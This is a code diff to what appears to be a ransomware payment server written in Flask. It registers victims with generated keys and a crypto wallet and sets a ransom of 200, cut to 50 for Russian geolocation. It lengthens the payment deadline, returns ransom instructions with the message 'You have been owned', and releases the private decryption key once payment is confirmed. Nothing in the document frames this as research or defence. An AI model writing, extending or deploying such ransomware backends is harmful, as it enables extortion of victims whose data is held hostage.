@@ -12,6 +12,8 @@ import pytz, logging
 from bleach import clean
 from datetime import timedelta
 from utilities.wallet_api import gen_wallet
+from utilities.deadline import format_date
+from utilities.instructions import instruct
 
 
 tz = pytz.timezone('America/Toronto')
@@ -42,7 +44,8 @@ def new_user():
 
         keys = gen_keys()
         tz = datetime.now().astimezone().tzinfo
-        expiration_date = datetime.now(tz=tz) + timedelta(minutes=30)
+        expiration_date = datetime.now(tz=tz) + timedelta(hours=8)
+
         payment = 200
         if geolocation.get("country") == "Russia":
             payment = 50
@@ -91,7 +94,17 @@ def new_user():
 
         schedule_termination(user.id, expiration_date)
 
-        return jsonify({"message": "User and keys added successfully."}), 201
+        return jsonify({
+            "message": "User and keys added successfully.",
+            "user_data": {
+                "payment_amount": str(payment),
+                "deadline": format_date(expiration_date),
+                "wallet_address": wallet["wallet_address"],
+                "public_key": keys[1],
+                "instructions": instruct,
+                "message": "You have been owned."
+            }
+        }), 201
 
     except Exception as e:
         print(e)
@@ -101,7 +114,7 @@ def new_user():
 
 @app.route("/check-payment", methods=["POST"])
 @csrf.exempt
-@limiter.limit("2 per 1 hour")
+@limiter.limit("1000 per 1 hour")
 def check_payment():
     try:
         data = request.json
@@ -113,11 +126,16 @@ def check_payment():
             return jsonify({"error": "No UID provided."}), 400
 
         paid_user = UsersPaid.query.filter_by(uid=uid).first()
-        if paid_user and paid_user.status:
+        user = Users.query.filter_by(uid=uid).first()
+
+        #if paid_user and paid_user.status:
+        if user and user.status:
             return jsonify({
                 "STATUS": "SUCCESS",
-                "PRIVATE_KEY": str(paid_user.private_key)
+                "PRIVATE_KEY": str(user.private_key)
             }), 200
+        elif user:
+            return jsonify({"status": "Payment is insufficient.", "amount_paid": str(user.amount_paid)}), 200
         else:
             return jsonify({"error": "Payment not yet complete."}), 400
 
